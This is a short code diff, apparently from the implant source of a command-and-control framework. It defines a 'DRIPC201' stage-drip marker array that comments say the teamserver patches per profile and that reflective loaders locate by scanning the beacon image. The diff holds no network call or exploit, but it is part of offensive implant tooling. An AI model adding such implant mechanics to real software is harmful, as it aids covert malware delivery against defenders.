@@ -124,11 +124,17 @@ void datastore_reset_for_test(int slots) {
 /* C-56: pin the DRIPC201 stage-drip marker into the final image. The x86
  * linker dropped the unreferenced volatile array (x64 kept it); an active
  * relocation from this initializer pins it on every toolchain. */
-/* NOTE: this project compiles .c as C++ (global CompileAs override; only
- * the interpreter files opt back to C) - so the plain extern below and the
- * stage_drip.c definition share C++ mangling on EVERY toolchain/config.
- * Do NOT wrap this in extern "C" (round-5 CI lesson). */
-extern volatile unsigned char g_stage_drip[16];
+/* C-56: DRIPC201 stage-drip marker, defined HERE (datastore.cpp is
+ * compiled into every beacon variant) so no cross-TU linkage is involved
+ * - the TS patches enable+delay into these bytes per-profile and the
+ * reflective loaders find them by scanning the image (udrl/
+ * ReflectiveLoader.c). The pin pointer references the array so no
+ * config's /OPT:REF drops it (x86 lesson). Zeros = drip off. */
+volatile unsigned char g_stage_drip[16] = {
+	'D', 'R', 'I', 'P', 'C', '2', '0', '1',
+	0, 0, 0, 0, /* enable (u32 LE) */
+	0, 0, 0, 0  /* delay ms (u32 LE) */
+};
 volatile unsigned char *g_stage_drip_pin = g_stage_drip;
 
 void cs49_apply_settings(void) {
